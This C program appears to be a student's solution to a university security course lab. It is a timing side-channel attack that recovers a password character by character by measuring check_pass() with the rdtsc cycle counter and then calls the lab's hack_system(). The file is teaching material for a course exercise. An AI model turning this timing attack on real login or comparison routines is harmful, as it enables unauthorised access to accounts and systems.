/*******************************************************
 CSE127 Project
 User routines file

  You can change anything in this file, just make sure 
  that when you have found the password, you call 
  hack_system() function on it.

 CSE127 Password guesser using timing

 *******************************************************/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

// include our "system" header
#include "sysapp.h"

// Read cycle counter
#define rdtsc() ({ unsigned long a, d; asm volatile("rdtsc":"=a" (a), "=d" (d)) ; a; })

int cmpfn(const void * a, const void * b){
   return ( *(unsigned long *)a - *(unsigned long *)b  );
}

int main(int argc, char **argv) {
    char guess[33];
    unsigned long startTime, endTime, median;
    int isCorrect = 0;
    unsigned long timeTaken[101];

    // set guess to zeros
    bzero(guess, sizeof(guess));

    //
    // do the guessing (this is where your code goes)
    //   we suggest a loop over the size of the possible
    //   password, each time trying all possible characters
    //   and looking for time deviations
    //
    int charsChecked;
    int currChar;
    int numTrials;
    char possibleChar;
    
    // keep trying to guess the correct password, until we get it
    while(!isCorrect) {
      
      // loop over each char of password, max length is 32 bytes
      for(charsChecked = 0; charsChecked < 32; charsChecked++) {
         median = 0;
         // try each possible char, keep track of time it takes
         for(currChar = 33; currChar < 127; currChar++) {      
            guess[charsChecked] = currChar; // temp add char to guess
            
            // try guess 101 times, recording time
            for(numTrials = 0; numTrials < 101; numTrials++) {
               startTime = rdtsc();
               isCorrect = check_pass(guess);
               endTime = rdtsc();
               timeTaken[numTrials] = endTime - startTime;
               // if time messes up redo trial
               if(endTime < startTime) numTrials--; 
            }
            // sort times to find median, if it took longer then that
            // char is probably correct
            qsort(timeTaken,101,sizeof(unsigned long), cmpfn);
            if(timeTaken[50] > median) {
               median = timeTaken[50];
               possibleChar = currChar;
            }
            if (isCorrect) {
               printf("Password Found!\n");
               hack_system(guess);
            };
         }
         guess[charsChecked] = possibleChar;
      
      } // end loop over charsChecked
      
      // if our guess was wrong, just try again
      bzero(guess, sizeof(guess));
    }
    printf("Could not get the password!  Last guess was %s\n", guess);
    return 1;
};
